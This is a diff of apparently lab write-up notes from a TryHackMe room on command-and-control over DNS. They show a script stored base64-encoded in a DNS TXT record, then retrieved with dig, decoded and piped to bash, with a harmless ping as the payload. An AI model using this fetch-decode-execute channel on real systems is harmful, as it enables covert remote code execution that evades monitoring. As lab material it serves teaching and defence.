@@ -102,7 +102,7 @@ Clean and restore the received data:
 
 ## C2 communications over DNS
 
-In victim2, create a script.sh in /tmp
+In victim2, create a `script.sh` in `/tmp`:
 
     thm@victim2:~$ cd /tmp/
     thm@victim2:/tmp$ nano script.sh
@@ -117,14 +117,14 @@ Encode the script:
     thm@victim2:~$ cat /tmp/script.sh | base64
     IyEvYmluL2Jhc2ggCnBpbmcgLWMgMSB0ZXN0LnRobS5jb20K
 
-Add it as a `TXT` `DNS` record to the tunnel.com domain using the web interface provided: http://MACHINE_IP/
+Add it as a `TXT` `DNS` record to the `tunnel.com` domain using the web interface provided: http://MACHINE_IP/
 
 Confirm it was added successfully:
 
     thm@victim2:~$ dig +short -t TXT script.tunnel.com
     "IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo="
 
-Run the script:
+Run the script (clean using `tr` and deleting any double quotes `"`):
 
     thm@victim2:~$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
     PING test.thm.com (127.0.0.1) 56(84) bytes of data.
